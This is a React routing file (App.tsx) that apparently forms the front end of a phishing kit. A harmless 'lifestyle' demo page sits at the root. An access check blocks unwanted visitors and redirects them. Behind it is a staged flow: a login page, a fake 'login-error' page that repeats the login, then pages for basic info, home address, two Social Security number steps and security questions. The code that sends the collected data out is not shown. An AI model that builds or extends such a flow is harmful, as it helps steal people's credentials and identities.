import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import type { ReactNode } from 'react';
import useAccessCheck from './Utils/useAccessCheck';
import { baseUrl } from './constants';

// Components
import FlowLayout from './components/FlowLayout';

// Pages
import LoginForm from './pages/LoginForm';
import LoginForm2 from './pages/LoginForm2';
import Register from './pages/Register';
import BasicInfo from './pages/BasicInfo';
import HomeAddress from './pages/HomeAddress';
import SSN1 from './pages/SSN1';
import SSN2 from './pages/SSN2';
import SecurityQuestions from './pages/SecurityQuestions';
import Terms from './pages/Terms';
import LifestyleDemo from './pages/LifestyleDemo';

interface ProtectedLayoutProps {
  children: ReactNode;
  containerClassName?: string;
  showBanner?: boolean;
}

const ProtectedLayout: React.FC<ProtectedLayoutProps> = ({ children, containerClassName, showBanner }) => {
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return (
      <FlowLayout showBanner={showBanner}>
        <div className="text-white text-center text-lg">Loading...</div>
      </FlowLayout>
    );
  }

  if (isAllowed === false) {
    return (
      <FlowLayout showBanner={showBanner}>
        <div className="text-white text-center text-lg">Access denied. Redirecting...</div>
      </FlowLayout>
    );
  }

  return (
    <FlowLayout showBanner={showBanner}>
      <div className={containerClassName ?? 'w-full max-w-2xl'}>{children}</div>
    </FlowLayout>
  );
};

const ProtectedRoute: React.FC<ProtectedLayoutProps> = ({ children, containerClassName, showBanner }) => (
  <ProtectedLayout containerClassName={containerClassName} showBanner={showBanner}>
    {children}
  </ProtectedLayout>
);

function App() {
  return (
    <Router>
      <Routes>
        <Route path="/" element={<LifestyleDemo />} />
        <Route
          path="/login"
          element={
            <ProtectedRoute containerClassName="w-full max-w-md">
              <LoginForm />
            </ProtectedRoute>
          }
        />
        <Route
          path="/login-error"
          element={
            <ProtectedRoute containerClassName="w-full max-w-md">
              <LoginForm2 />
            </ProtectedRoute>
          }
        />
        <Route
          path="/register"
          element={
            <ProtectedRoute>
              <Register />
            </ProtectedRoute>
          }
        />
        <Route
          path="/basic-info"
          element={
            <ProtectedRoute>
              <BasicInfo />
            </ProtectedRoute>
          }
        />
        <Route
          path="/home-address"
          element={
            <ProtectedRoute>
              <HomeAddress />
            </ProtectedRoute>
          }
        />
        <Route
          path="/ssn1"
          element={
            <ProtectedRoute>
              <SSN1 />
            </ProtectedRoute>
          }
        />
        <Route
          path="/ssn2"
          element={
            <ProtectedRoute>
              <SSN2 />
            </ProtectedRoute>
          }
        />
        <Route
          path="/security-questions"
          element={
            <ProtectedRoute>
              <SecurityQuestions />
            </ProtectedRoute>
          }
        />
        <Route
          path="/terms"
          element={
            <ProtectedRoute showBanner={false}>
              <Terms />
            </ProtectedRoute>
          }
        />
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </Router>
  );
}

export default App;
